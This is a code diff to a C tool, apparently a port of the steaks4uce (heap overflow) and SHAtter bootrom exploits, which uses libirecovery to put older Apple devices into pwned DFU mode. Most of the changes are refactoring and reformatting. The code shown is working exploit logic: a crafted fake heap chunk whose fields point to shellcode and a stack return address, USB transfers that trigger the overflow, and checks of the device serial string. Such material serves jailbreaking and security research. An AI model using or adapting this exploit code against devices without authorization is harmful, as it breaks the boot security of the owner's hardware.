@@ -68,18 +68,18 @@ const uint32_t constants_240_5_1[] = {
 };
 
 const uint32_t payload_data[] = {
-    0x84, // 0x00: previous_chunk
-    0x05, // 0x04: next_chunk
-    0x80, // 0x08: buffer[0] - direction
+          0x84, // 0x00: previous_chunk
+          0x05, // 0x04: next_chunk
+          0x80, // 0x08: buffer[0] - direction
     0x22026280, // 0x0c: buffer[1] - usb_response_buffer
     0xFFFFFFFF, // 0x10: buffer[2]
-    0x138, // 0x14: buffer[3] - size of payload in bytes
-    0x100, // 0x18: buffer[4]
-    0x0, // 0x1c: buffer[5]
-    0x0, // 0x20: buffer[6]
-    0x0, // 0x24: unused
-    0x15, // 0x28: previous_chunk (fake free chunk)
-    0x2, // 0x2c: next_chunk
+         0x138, // 0x14: buffer[3] - size of payload in bytes
+         0x100, // 0x18: buffer[4]
+           0x0, // 0x1c: buffer[5]
+           0x0, // 0x20: buffer[6]
+           0x0, // 0x24: unused
+          0x15, // 0x28: previous_chunk (fake free chunk)
+           0x2, // 0x2c: next_chunk
     0x22000001, // 0x30: fd - shellcode_address
     0x2202D7FC  // 0x34: bk - LR on the stack
 };
@@ -132,18 +132,16 @@ void release_device(irecv_client_t client) {
 }
 
 int send_data(irecv_client_t client, const unsigned char* data, size_t data_len) {
+    size_t index = 0;
     printf("Sending 0x%zx bytes of data to device.\n", data_len);
 
-    size_t index = 0;
     while (index < data_len) {
         size_t amount = (data_len - index > MAX_PACKET_SIZE) ? MAX_PACKET_SIZE : (data_len - index);
-
         int ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)(data + index), (uint16_t)amount, 5000);
         if (ret != amount) {
             fprintf(stderr, "Transfer failed at index %zu: expected %zu, got %d\n", index, amount, ret);
             return -1;
         }
-
         index += amount;
     }
 
@@ -176,7 +174,6 @@ int usb_reset(irecv_client_t client) {
 int request_image_validation(irecv_client_t client) {
     int ret;
     unsigned char dummy[6];
-
     printf("Requesting image validation.\n");
 
     ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, 0, 0, 1000);
@@ -201,9 +198,8 @@ int steaks4uce_exploit(irecv_client_t client) {
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
     unsigned char payload[0x138] = {0};
     memcpy(payload + 0x100, payload_data, sizeof(payload_data));
-
-    printf("*** based on steaks4uce exploit (heap overflow) by pod2g ***\n");
     prepare_shellcode(devinfo->srtg);
+    printf("*** based on steaks4uce exploit (heap overflow) by pod2g ***\n");
 
     printf("Resetting USB counters.\n");
     ret = irecv_reset_counters(client);
@@ -262,8 +258,6 @@ int steaks4uce_exploit(irecv_client_t client) {
 
 int shatter_exploit(irecv_client_t client) {
     int ret;
-    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
-
     printf("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***\n");
 
     printf("Resetting USB counters.\n");
@@ -368,7 +362,7 @@ int shatter_exploit(irecv_client_t client) {
         return -1;
     }
 
-    devinfo = irecv_get_device_info(client);
+    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
     char* p = strstr(devinfo->serial_string, "PWND:[SHAtter]");
     if (!p) {
         fprintf(stderr, "ERROR: Exploit failed. Device did not enter pwned DFU mode.\n");
@@ -382,7 +376,6 @@ int shatter_exploit(irecv_client_t client) {
 }
 
 int boot_unpacked_ibss(irecv_client_t client, const char *ibss_path) {
-    // Just check if file exists for now
     FILE *f = fopen(ibss_path, "rb");
     if (!f) {
         fprintf(stderr, "ERROR: Unable to open iBSS file\n");
@@ -436,9 +429,14 @@ int main(int argc, char* argv[]) {
 
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
     char* p = strstr(devinfo->serial_string, "PWND:[");
-    if (p && argc > 1) {
-        ret = boot_unpacked_ibss(client, argv[1]);
-        return ret;
+    if (argc > 1) {
+        if (p) {
+            ret = boot_unpacked_ibss(client, argv[1]);
+            return ret;
+        } else {
+            fprintf(stderr, "ERROR: Device is not in pwned DFU mode. Cannot boot unpacked iBSS.\n");
+            return -1;
+        }
     } else if (p) {
         printf("Device is already in pwned DFU mode.\n");
         return 0;
